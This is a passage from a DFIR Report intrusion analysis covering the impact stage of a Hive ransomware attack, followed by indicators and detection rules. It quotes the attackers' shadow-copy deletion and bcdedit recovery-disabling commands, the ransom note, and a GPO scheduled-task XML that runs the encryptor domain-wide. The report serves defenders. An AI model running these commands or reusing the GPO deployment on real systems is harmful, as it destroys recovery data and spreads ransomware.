<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-054.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21602" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-054.png" alt width="444" height="427" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-054.png 444w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-054-300x289.png 300w" sizes="(max-width: 444px) 100vw, 444px" /></a><img alt /></figure>
<h4 class="wp-block-heading">Cobalt Strike</h4>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td><strong>IP</strong></td>
<td><strong>Port</strong></td>
<td><strong>Domain</strong></td>
<td><strong>JA3</strong></td>
<td><strong>JA3s</strong></td>
</tr>
<tr>
<td>31.41.244.192</td>
<td>80</td>
<td>N/A</td>
<td>N/A</td>
<td>N/A</td>
</tr>
<tr>
<td>23.108.57.83</td>
<td>443</td>
<td>sodiwugoc[.]com</td>
<td>a0e9f5d64349fb13191bc781f81f42e1</td>
<td>ae4edc6faf64d08308082ad26be60767</td>
</tr>
</tbody>
</table>
</figure>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>SSL Certificate SHA256</td>
<td><a href="https://crt.sh/?q=95C86AC5CE23ABA5133F61CA0D2D637F74105FA05E88D232141F057A1DF7DD8B" target="_blank" rel="noreferrer noopener">95C86AC5CE23ABA5133F61CA0D2D637F74105FA05E88D232141F057A1DF7DD8B</a></td>
</tr>
<tr>
<td>Certificate Subject</td>
<td>sodiwugoc[.]com</td>
</tr>
<tr>
<td>Certificate Issuer</td>
<td>Sectigo Limited</td>
</tr>
<tr>
<td>Not Before</td>
<td>2022-10-19 00:00:00 UTC</td>
</tr>
<tr>
<td>Not After</td>
<td>2023-10-19 23:59:59 UTC</td>
</tr>
<tr>
<td>Public Algorithm</td>
<td>TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384</td>
</tr>
</tbody>
</table>
</figure>
<h3 class="wp-block-heading">Metasploit</h3>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td><strong>IP</strong></td>
<td><strong>Port</strong></td>
</tr>
<tr>
<td>94.232.43.201</td>
<td>4433</td>
</tr>
<tr>
<td>94.232.43.201</td>
<td>4444</td>
</tr>
</tbody>
</table>
</figure>
<h3 class="wp-block-heading">ScreenConnect</h3>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>IP</td>
<td>Port</td>
<td>Domain</td>
</tr>
<tr>
<td>145.40.113.124</td>
<td>443</td>
<td>server-nixd7639ccc-relay[.]screenconnect[.]com</td>
</tr>
<tr>
<td>147.75.84.232</td>
<td>443</td>
<td>server-nixee656b9a-relay[.]screenconnect[.]com</td>
</tr>
</tbody>
</table>
</figure>
<h2 class="wp-block-heading"> </h2>
<h2 id="impact" class="wp-block-heading"><a href="#impact">Impact</a></h2>
<p>With exfiltration achieved, the threat actor proceeded to the impact stage. First, they changed the administrator account&#8217;s password, and one hour later, they started deploying ransomware.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-055.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21603" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-055.png" alt width="946" height="128" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-055.png 946w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-055-300x41.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-055-768x104.png 768w" sizes="(max-width: 946px) 100vw, 946px" /></a></figure>
<p>As can be seen in the following process creation logs, the ransomware was executed both from the beacons, as well as interactively by opening the command interpreter (<i>cmd.exe</i>). Once critical systems encrypted, the threat actor completed their impact with a final network share encryption (<i>-network-only</i>).</p>
<p>To avoid analysis by threat intelligence companies should the sample leak online, the ransomware executable requires credentials for their chat to be provided through the command line argument <i>-u</i>.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-063.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21604" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-063.png" alt width="1787" height="184" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-063.png 1787w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-063-300x31.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-063-1024x105.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-063-768x79.png 768w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-063-1536x158.png 1536w" sizes="(max-width: 1787px) 100vw, 1787px" /></a></figure>
<p>As part of the encryption, the ransomware inhibits system recovery by deleting all shadow copies and altering boot settings.</p>
<pre>"C:\Windows\System32\wbem\WMIC.exe" shadowcopy delete
"C:\Windows\System32\vssadmin.exe" delete shadows /all /quiet
"C:\Windows\System32\bcdedit.exe" /set {default} recoveryenabled No
"C:\Windows\System32\bcdedit.exe" /set {default} bootstatuspolicy ignoreallfailures
</pre>
<p>Once encrypted, the ransom note is written to <i>C:\Users\Default\HOW_TO_DECRYPT.txt</i> which, when accessed, reveals the ransomware operation to be the <a href="https://www.justice.gov/opa/pr/us-department-justice-disrupts-hive-ransomware-variant" target="_blank" rel="noreferrer noopener">now-seized</a> Hive.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-056.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21605" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-056.png" alt width="346" height="162" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-056.png 346w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-056-300x140.png 300w" sizes="(max-width: 346px) 100vw, 346px" /></a></p>
<pre>Your network has been breached and all data were encrypted.
Personal data, financial reports and important documents are ready to disclose.

To decrypt all the data and to prevent exfiltrated files to be disclosed at 
http://hiveleakdbtnp76ulyhi52eag6c6tyc3xw7ez7iqy6wc34gd2nekazyd.onion/
you will need to purchase our decryption software.

Please contact our sales department at:

   http://hivecust6vhekztbqgdnkks64ucehqacge3dij3gyrrpdp57zoq3ooqd.onion/

      Login:    REDACTED
      Password: REDACTED

To get an access to .onion websites download and install Tor Browser at:
   https://www.torproject.org/ (Tor Browser is not related to us)


Follow the guidelines below to avoid losing your data:

 - Do not modify, rename or delete *.key files. Your data will be 
   undecryptable.
 - Do not modify or rename encrypted files. You will lose them.
 - Do not report to the Police, FBI, etc. They don't care about your business.
   They simply won't allow you to pay. As a result you will lose everything.
 - Do not hire a recovery company. They can't decrypt without the key. 
   They also don't care about your business. They believe that they are 
   good negotiators, but it is not. They usually fail. So speak for yourself.
 - Do not reject to purchase. Exfiltrated files will be publicly disclosed.
</pre>
<p>To achieve domain-wide impact, the threat actor attempted to deploy a Group Policy Object (GPO). The creation of this GPO can be observed by the usage of <i>gpme.msc</i> (Group Policy Management Editor).</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-057.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21606" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-057.png" alt width="535" height="433" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-057.png 535w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-057-300x243.png 300w" sizes="(max-width: 535px) 100vw, 535px" /></a></figure>
<p>File creation events highlight how, for the newly created group policy, the threat actor created a scheduled task within the user configuration. This scheduled task was intended to execute the ransomware from a network share on a daily basis. This setting, however, failed to deploy the ransomware domain-wide as such a scheduled task <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/63d65a82-e538-49ad-8009-e5a0e97a40df" target="_blank" rel="noreferrer noopener">should be defined within the machine configuration</a> instead. This resulted in only successful encryption on the hosts where the threat actor manually ran the ransomware.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-058.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21607" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-058.png" alt width="552" height="194" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-058.png 552w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-058-300x105.png 300w" sizes="(max-width: 552px) 100vw, 552px" /></a></figure>
<pre>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}"&gt;
    &lt;Task clsid="{2DEECB1C-261F-4e13-9B21-16FB83BC03BD}" name="REDACTED" image="0"
        changed="REDACTED" uid="{EA5805D5-A098-423E-A5C7-6CD05F23F46F}"&gt;
        &lt;Properties action="C" name="REDACTED" appName="cmd.exe"
            args="/c \\REDACTED\netlogon\windows_x64_encrypt.exe -u REDACTED:REDACTED"
            startIn="" comment="" enabled="1"&gt;
            &lt;Triggers&gt;
                &lt;Trigger type="DAILY" startHour="REDACTED" startMinutes="0" beginYear="REDACTED"
                    beginMonth="REDACTED" beginDay="REDACTED" hasEndDate="0" repeatTask="0" interval="1" /&gt;
            &lt;/Triggers&gt;
        &lt;/Properties&gt;
    &lt;/Task&gt;
&lt;/ScheduledTasks&gt;
</pre>
<h2 id="timeline" class="wp-block-heading"><a href="#timeline">Timeline</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-061-2.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21649" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-061-2.png" alt width="4854" height="5902" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-061-2.png 4854w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-061-2-247x300.png 247w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-061-2-842x1024.png 842w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-061-2-768x934.png 768w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-061-2-1263x1536.png 1263w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-061-2-1684x2048.png 1684w" sizes="(max-width: 4854px) 100vw, 4854px" /></a></p>
<p>&nbsp;</p>
<h2 id="diamond-model" class="wp-block-heading"><a href="#diamond-model">Diamond Model</a></h2>
<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-060.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21609" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-060.png" alt width="3250" height="1552" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-060.png 3250w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-060-300x143.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-060-1024x489.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-060-768x367.png 768w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-060-1536x733.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-060-2048x978.png 2048w" sizes="(max-width: 3250px) 100vw, 3250px" /></a></p>
<h2 id="indicators" class="wp-block-heading"><a href="#indicators">Indicators</a></h2>
<h3 class="wp-block-heading">Atomic</h3>
<p>As this intrusion is dated from 2022, we recommend defenders question the relevancy of potentially outdated network-based indicators such as IPs.</p>
<pre># Cobalt Strike C2
31.41.244[.]192
23.108.57[.]83
sodiwugoc[.]com

# Metasploit 
94.232.43[.]201

# Rclone Exfiltration
190.2.146[.]96
</pre>
<h3 class="wp-block-heading">Computed</h3>
<p>The following hashes (SHA256, SHA1, MD5, and optionally, IMPHASH) represent adversary artifacts.</p>
<pre># ScreenConnect Installer (C:\Users\REDACTED\AppData\Local\Temp\setup.msi)
81997F4404FEBFB9C23F2F3939934513D499593750B4A4826C32878E05B83F30
1107586E676B0DF849948C5A5501CDEC1C72AF9E
5B4B0713FC9A9B203A9FC2393F26439E

# ScreenConnect Scripts
## C:\Windows\Temp\ScreenConnect\22.8.9717.8313\700893a5-90ad-456f-b9a8-7ce8e2f291afrun.ps1
D04E7E776EA28AF69381E346A1BF86BE5F5E4715003F7048783E7D1F049B1BD2
93A2CAE74FC883B88049C6C1F92BFD9A45B5881D
3DF36FB3A469CFE6172A65ED8CF7C8F3

## C:\Windows\Temp\ScreenConnect\22.8.9717.8313\de873d67-cd59-4075-9a9a-aa1d3cd0817erun.ps1
F6834C4A5BB01A7D3A43B11A4792F8149714E4D1B271810F79772E50B6395615
7B9543925CAA83A5145FF5F419D5EBA6F0819133
BAC73D85EFC48B0517F4E0CC3DDEBB65

## C:\Windows\Temp\ScreenConnect\22.8.9717.8313\6142516f-9df2-40fa-b575-87f111d56411run.cmd
7C89590CEA3B702C84D3B1A566705067D4BDE1B97ECD160D553FF1380E0EF5A6
08439255DF7A9FA5553D5BD1CDC5291327FAD1C4
813E3BD0C15DBC0A394CD030C508BA84

## C:\Windows\Temp\ScreenConnect\22.8.9717.8313\4b31bad0-8850-4a8c-83e3-efe0d39d36c8run.cmd
59CB534E02A16FD3D21D1BA5D34EE15E665D7A955751171249563D1192AA33E4
3DDB8CA1B50E240736BB4B86FDFF00FFC79D8C47
ACAE4CC666AB060797ABB92F02E94327

## C:\Windows\Temp\ScreenConnect\22.8.9717.8313\d33a41b1-606a-4a18-8030-8df1578ae248run.cmd
DF024E7AE2FF6CEF51EE80D30F10F94233A5DDD62DA22ECF3C6AB3EBC293264B
6CC49BD84647C6DEA09609689D5F5DFB58BDCE09
578188E75C3FB543D04930DEA547CFAA

## C:\Windows\Temp\ScreenConnect\22.8.9717.8313\fa9f4f97-996e-4753-9957-936eec5b7d1arun.cmd
D51E34A47A79465A0EF3916FE01FE667E8E4281EF3B676569E6A1A33419E51EA
21EF9F0A078DBC4E4C45BE12F1CFAF8A3864DFA7
5FB4780E00B965F8454EF28BC61C0605

## C:\Windows\Temp\ScreenConnect\22.8.9717.8313\352a8d52-3f6d-4fe3-919c-1e6abc5145cbrun.cmd
99A54FF551197D131477152D3D27E38787CA949FFDBB041F15752767EFE1E645
265137BDEF97FE25CA0B23CE6D3DD4AB501AB7B5
F0AAC1F299148638688C067F2029D27A

## C:\Windows\Temp\ScreenConnect\22.8.9717.8313\c896bba0-8476-4a90-bc8e-c0af107b8a82run.cmd
03EE627A2557D83D28A90857678966709EC24582434A5D2F0653012B088276D1
F479CDB6A34462C664FAD0051F4BD5CFE84017E0
BC19BF002CD9B7E0AE90FE7374755639

## C:\Windows\Temp\ScreenConnect\22.8.9717.8313\7c731819-bd1a-46b7-9be5-30585a8551bbrun.cmd
02F4B8D558EDB290FAE03B8F1A7B412E988EAB3738D11EDB7D59890C784EDB68
4AC2A4FABAB8EB621130B979642F239B19B37330
7D0F3C5AD18ABE8C4F7270D115E910F2

## C:\Windows\Temp\ScreenConnect\22.8.9717.8313\6a60db01-fb3d-4dfc-b81c-ed76379fc364run.cmd
336074805FC853987ABE6F7FE3AD97A6A6F3077A16391FEC744F671A015FBD7E
714EEA0F4C980736BDE0065FE73F573487F08E3A
07CC694B9B3FC636710FA08B6922C42B

# Trojanized ApacheBench (C:\Windows\Temp\P6nqEdwk.exe)
9B39887828999F7F3916262574C46B835D38F200FCD3C07C2BBE9A83C9F935A9
080B77C2D5E94E86607CBE462224FF46B20B6288
CAB4CBEF593DB0F14ED4ADF041ECD6B1
481F47BBB2C9C21E108D65F52B04C448

# Atera Installer (C:\programdata\setup.msi)
DBE18FFC724931DEE3EA99C75C9B4EA8E27B228E19508211689CC7C3249680D3
C27DD709E7122E782DD0C8B2E3A2709B6622BED4
947A9B0FA0B5F6FEFB4FCA98D577EBDB

# Mimikatz (C:\ProgramData\m2.exe)
197B8CCDDB54C39049B308A9A5037DC7BF7D3689BDC759504F3C36D483BEB9D3
1FEBDC5ADE9D979CDD800C330AD5D875C5BF160B
AF25483D713A3BBB87483340CCFF0B31
17E022F96085B5DE3A2CD85F7CC791CA

# C:\ProgramData\adcomp.bat
4AA4EE8EFCF68441808D0055C26A24E5B8F32DE89C6A7A0D9B742CCE588213ED
B658AB9AC2453CDE5CA82BE667040AC94BFCBE2E
EB2335E887875619B24B9C48396D4D48

# C:\Windows\Temp\unpack\setup.msi
F25863DAA1AD0104B25B91581F7B1CC4F65CA63FF4D1BB956ECD3F9350E365A5
1DD933817806728380FD1AEE46D9F8D42251EA7F
59216909D3E63903D2426272EC72FE61

# Rclone (C:\ProgramData\rclone\rclone.exe)
F1C87C2A32B1F0D2210A12EBCB1D3146B54E3BB5DB3FB97DBD81FE123D411632
940355F1CEDE7793190886AECC9D15D42A62C1FA
B3FF5B773388E741559D6D9FCA914D9C
9ED01AB5DA47D5D90680F44088D41DD1

# Netscan (C:\ProgramData\netscan\netscan.exe)
E14BA0FB92E16BB7DB3B1EFAC4B13AEE178542C6994543E7535D8EFAA589870C
39300863BCAAD71E5D4EFC9A1CAE118440AA778F
A768244CA664349A6D1AF84A712083C0
8E081065872436B21EF3B90597247997

# Metasploit (C:\ProgramData\c64.dll, C:\ProgramData\x2.dll)
34452711502C9304DB8745510F96AA644481162C389F591147327F54D4AE3727
F3741EAE58E9053773FEC7C01472862933E3B91A
ED70A46CA74BE495AEFA84FCFDCA48EC
83F0993D7B939D94887D773073847DED

# Hive Ransomware (C:\windows_x64_encrypt.exe, C:\ProgramData\windows_x64_encrypt.exe)
14F00D914CCD46553FB30933FBE691E22E5197AD6A32BC076BA19935EBB7E5AA
7D51D3D2AC2F16672CAE331A48431B8CCB9F0820
3B375E1765628817FD2EB01240C7D262
04133426D49D0049E9825522E2A41306

# Scheduled Task GPO (C:\Windows\Sysvol\domain\Policies\{EE3DB3D4-92F9-4A97-8E8F-364A02A6E5D1}\User\Preferences\ScheduledTasks\ScheduledTasks.xml)
10525032A7595DF974A9649042ACAB0FDA5C1E5A59297AD1709BBF463ADB2E50
37AF04902E237A19EFFDF09E8B106C0309717233
E6EC25A3D448A1490AC10C239A001570
</pre>
<h2 id="detections" class="wp-block-heading"><a href="#detections">Detections</a></h2>
<h3 class="wp-block-heading">Network</h3>
<pre>ET ATTACK_RESPONSE PowerShell Base64 Encoded Content Command Common In Powershell Stagers M2
ET ATTACK_RESPONSE PowerShell NoProfile Command Received In Powershell Stagers
ET HUNTING GENERIC SUSPICIOUS POST to Dotted Quad with Fake Browser 1
ET HUNTING PE EXE Download over raw TCP
ET HUNTING PowerShell Hidden Window Command Common In Powershell Stagers M1
ET HUNTING PowerShell NonInteractive Command Common In Powershell Stagers
ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response
ET INFO Executable Retrieved With Minimal HTTP Headers - Potential Second Stage Download
ET INFO Splashtop Domain (splashtop .com) in TLS SNI
ET INFO Splashtop Domain in DNS Lookup (splashtop .com)
ET INFO Suspected Impacket WMIExec Activity
ET MALWARE Cobalt Strike Beacon Observed
ET MALWARE Possible Metasploit Payload Common Construct Bind_API (from server)
ET POLICY Command Shell Activity Using Comspec Environmental Variable Over SMB - Very Likely Lateral Movement
ET POLICY PE EXE or DLL Windows file download HTTP
ET POLICY Powershell Activity Over SMB - Likely Lateral Movement
ET POLICY Powershell Command With Hidden Window Argument Over SMB - Likely Lateral Movement
ET POLICY Powershell Command With No Profile Argument Over SMB - Likely Lateral Movement
ET POLICY Powershell Command With NonInteractive Argument Over SMB - Likely Lateral Movement
ET POLICY SMB Executable File Transfer
ET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement
ET POLICY SMB2 NT Create AndX Request For an Executable File
ET RPC DCERPC SVCCTL - Remote Service Control Manager Access
ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection
</pre>
<h3 class="wp-block-heading">Sigma</h3>
<p>Search sigma rules at <a href="https://detection.fyi/" target="_blank" rel="noreferrer noopener">detection.fyi</a></p>
<h4 class="wp-block-heading">Sigma Repo</h4>
<pre>Atera Agent Installation - 87261fb2-69d0-42fe-b9de-88c6b5f65a43
CobaltStrike Named Pipe - d5601f8c-b26f-4ab0-9035-69e11a8d4ad2
Credential Dumping Tools Accessing LSASS Memory - 32d0d3e2-e58d-4d41-926b-18b520b2b32d
Rare GrantedAccess Flags on LSASS Access - 678dfc63-fefb-47a5-a04c-26bcf8cc9f65
DNS Query To Remote Access Software Domain - 4d07b1f4-cb00-4470-b9f8-b0191d48ff52
HackTool - Potential Impacket Lateral Movement Activity - 10c14723-61c7-4c75-92ca-9af245723ad2
Persistence and Execution at Scale via GPO Scheduled Task - a8f29a7b-b137-4446-80a0-b804272f3da2
PowerShell Base64 Encoded IEX Cmdlet - 88f680b8-070e-402c-ae11-d2914f2257f1
PowerShell Download and Execution Cradles - 85b0b087-eddf-4a2b-b033-d771fa2b9775
PUA - Rclone Execution - e37db05d-d1f9-49c8-b464-cee1a4b11638
Remote Access Tool - ScreenConnect Execution - 57bff678-25d1-4d6c-8211-8ca106d12053
Usage Of Web Request Commands And Cmdlets - 9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d
Suspicious Encoded PowerShell Command Line - ca2092a1-c273-4878-9b4b-0d60115bf5ea
Suspicious Group And Account Reconnaissance Activity Using Net.EXE - d95de845-b83c-4a9a-8a6a-4fc802ebf6c0
Suspicious PowerShell IEX Execution Patterns - 09576804-7a05-458e-a817-eb718ca91f54
Suspicious Reconnaissance Activity - d95de845-b83c-4a9a-8a6a-4fc802ebf6c0
Wmiexec Default Output File - 8d5aca11-22b3-4f22-b7ba-90e60533e1fb
</pre>
<h4 class="wp-block-heading">JoeSecurity Repo</h4>
<pre>Shadow Copies Deletion Using Operating Systems Utilities - c947b146-0abc-4c87-9c64-b17e9d7274a2</pre>
<h3 class="wp-block-heading">YARA</h3>
<p><a href="https://github.com/gentilkiwi/mimikatz/blob/master/kiwi_passwords.yar" target="_blank" rel="noreferrer noopener">https://github.com/gentilkiwi/mimikatz/blob/master/kiwi_passwords.yar</a></p>
<p><a href="https://github.com/The-DFIR-Report/Yara-Rules/blob/main/18364/18364.yar">https://github.com/The-DFIR-Report/Yara-Rules/blob/main/18364/18364.yar</a></p>
<h2 id="mitre" class="wp-block-heading"><a href="#mitre">MITRE</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-061-3.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21650" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-061-3.png" alt width="2100" height="2654" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-061-3.png 2100w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-061-3-237x300.png 237w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-061-3-810x1024.png 810w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-061-3-768x971.png 768w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-061-3-1215x1536.png 1215w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-061-3-1620x2048.png 1620w" sizes="(max-width: 2100px) 100vw, 2100px" /></a></p>
<p>&nbsp;</p>
<pre>Remote Access Software - T1219
SMB/Windows Admin Shares - T1021.002
PowerShell - T1059.001
Windows Command Shell - T1059.003
Scheduled Task - T1053.005
Service Execution - T1569.002
Malicious File - T1204.002
Windows Management Instrumentation - T1047
Domain Account - T1087.002
Local Account - T1087.001
Domain Groups - T1069.002
Process Injection - T1055
File Deletion - T1070.004
Command Obfuscation - T1027.010
Msiexec - T1218.007
Rundll32 - T1218.011
LSASS Memory - T1003.001
File and Directory Discovery - T1083
Network Share Discovery - T1135
System Information Discovery - T1082
System Network Configuration Discovery - T1016
System Owner/User Discovery - T1033
Lateral Tool Transfer - T1570
Remote Desktop Protocol - T1021.001
Web Protocols - T1071.001
Ingress Tool Transfer - T1105
Exfiltration Over Asymmetric Encrypted Non-C2 Protocol - T1048.002
Data Encrypted for Impact - T1486
Inhibit System Recovery - T1490
Native API - T1106
Windows Service - T1543.003
Embedded Payloads - T1027.009
Data from Network Shared Drive - T1039
Protocol Impersonation - T1001.003
BITS Jobs - T1197
Non-Standard Port - T1571
Data from Local System - T1005
Account Access Removal - T1531
Match Legitimate Name or Location - T1036.005
Exfiltration Over C2 Channel - T1041
Multi-Stage Channels - T1104
Permission Groups Discovery - T1069
Domain Trust Discovery - T1482
Dynamic API Resolution - T1027.007
</pre>
<pre>ConnectWise - S0591
cmd - S0106
Systeminfo - S0096
ipconfig - S0100
Net - S0039
Impacket - S0357
Rclone - S1040
Nltest - S0359
</pre>
<h4 class="wp-block-heading">DFIR Report Tracking</h4>
<pre>Atera
Splashtop Streamer
SoftPerfect Network Scanner
</pre>
<p>Internal case #18364</p>
<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-21520" class="share-twitter sd-button share-icon" href="https://thedfirreport.com/2023/09/25/from-screenconnect-to-hive-ransomware-in-61-hours/?share=twitter" target="_blank" title="Click to share on Twitter"><span>Twitter</span></a></li><li class="share-linkedin"><a rel="nofollow noopener noreferrer" data-shared="sharing-linkedin-21520" class="share-linkedin sd-button share-icon" href="https://thedfirreport.com/2023/09/25/from-screenconnect-to-hive-ransomware-in-61-hours/?share=linkedin" target="_blank" title="Click to share on LinkedIn"><span>LinkedIn</span></a></li><li class="share-reddit"><a rel="nofollow noopener noreferrer" data-shared class="share-reddit sd-button share-icon" href="https://thedfirreport.com/2023/09/25/from-screenconnect-to-hive-ransomware-in-61-hours/?share=reddit" target="_blank" title="Click to share on Reddit"><span>Reddit</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-21520" class="share-facebook sd-button share-icon" href="https://thedfirreport.com/2023/09/25/from-screenconnect-to-hive-ransomware-in-61-hours/?share=facebook" target="_blank" title="Click to share on Facebook"><span>Facebook</span></a></li><li class="share-jetpack-whatsapp"><a rel="nofollow noopener noreferrer" data-shared class="share-jetpack-whatsapp sd-button share-icon" href="https://thedfirreport.com/2023/09/25/from-screenconnect-to-hive-ransomware-in-61-hours/?share=jetpack-whatsapp" target="_blank" title="Click to share on WhatsApp"><span>WhatsApp</span></a></li><li class="share-end"></li></ul></div></div></div>
<div id="jp-relatedposts" class="jp-relatedposts">
<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
</div>
</div>
<footer class="entry-footer">
<div class="entry-meta">
</div>
</footer>
</div>
</article>
<nav class="navigation post-navigation" aria-label="Posts">
<h2 class="screen-reader-text">Post navigation</h2>
<div class="nav-links"><div class="nav-previous"><a href="https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/" rel="prev">HTML Smuggling Leads to Domain Wide Ransomware</a></div><div class="nav-next"><a href="https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/" rel="next">NetSupport Intrusion Results in Domain Compromise</a></div></div>
</nav>
</main>
</div>
<aside id="secondary" class="widget-area">
<section id="search-4" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://thedfirreport.com/">
<label>
<span class="screen-reader-text">Search for:</span>
<input type="search" class="search-field" placeholder="Search &hellip;" value name="s" />
</label>
<input type="submit" class="search-submit" value="Search" />
</form></section><section id="google_translate_widget-5" class="widget widget_google_translate_widget"><div id="google_translate_element"></div></section><section id="block-7" class="widget widget_block"> <div class="wp-block-jetpack-subscriptions__supports-newline wp-block-jetpack-subscriptions">
<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
<form action="https://wordpress.com/email-subscriptions" method="post" accept-charset="utf-8" data-blog="175340963" data-post_access_level="everybody" data-subscriber_email id="subscribe-blog">
<div class="wp-block-jetpack-subscriptions__form-elements">
<p id="subscribe-email">
<label id="subscribe-field-label" for="subscribe-field" class="screen-reader-text">
Type your email… </label>
<input required="required" type="email" name="email" class="no-border-radius " style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 0px;border-width: 1px;" placeholder="Type your email…" value id="subscribe-field" title="Please fill in this field." /> </p>
<p id="subscribe-submit">
<input type="hidden" name="action" value="subscribe" />
<input type="hidden" name="blog_id" value="175340963" />
<input type="hidden" name="source" value="https://thedfirreport.com/2023/09/25/from-screenconnect-to-hive-ransomware-in-61-hours/" />
<input type="hidden" name="sub-type" value="subscribe-block" />
<input type="hidden" name="app_source" value />
<input type="hidden" name="redirect_fragment" value="subscribe-blog" />
<input type="hidden" name="lang" value="en_US" />
<input type="hidden" id="_wpnonce" name="_wpnonce" value="2bedf18890" /><input type="hidden" name="_wp_http_referer" value="/2023/09/25/from-screenconnect-to-hive-ransomware-in-61-hours/" /><input type="hidden" name="post_id" value="21520" /> <button type="submit" class="wp-block-button__link no-border-radius" style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 0px;border-width: 1px;" name="jetpack_subscriptions_widget">
Subscribe </button>
</p>
</div>
</form>
</div>
</div>
</section><section id="block-21" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png" alt class="wp-image-35571 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png 200w, https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h4 class="wp-block-heading"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc">Register For Our Next CTF</a></h4>
</div></div>
</section><section id="block-8" class="widget widget_block">
